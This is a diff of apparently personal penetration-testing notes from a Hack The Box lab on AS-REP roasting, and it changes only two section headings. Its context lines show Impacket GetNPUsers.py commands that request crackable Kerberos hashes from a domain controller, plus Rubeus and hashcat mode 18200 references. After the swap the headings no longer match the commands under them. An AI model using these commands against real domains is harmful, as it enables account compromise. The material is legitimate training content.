@@ -18,7 +18,7 @@ retrieving hash using Rubeus
 then crack with hashcat mode 18200
 ```
 
-### Enumerating From Linux external uncredentialed & Credentialed - GETNPUsers.py
+### Enumerating From Linux external uncredentialed & Credentialed - Kebrute
 
 ```powershell
 #Try all the usernames in usernames.txt JANGAN LUPA ADD DOMAIN TO ETC HOSTS
@@ -33,7 +33,7 @@ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_a
 python GetNPUsers.py domain_name/username:password -request -format hashcat -outputfile hashes.asreproast
 ```
 
-### Enumerating AS-REP Using Kerbrute
+### Enumerating AS-REP Using Impacket-GetNPUsers.py
 
 ```bash
 Foresty@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
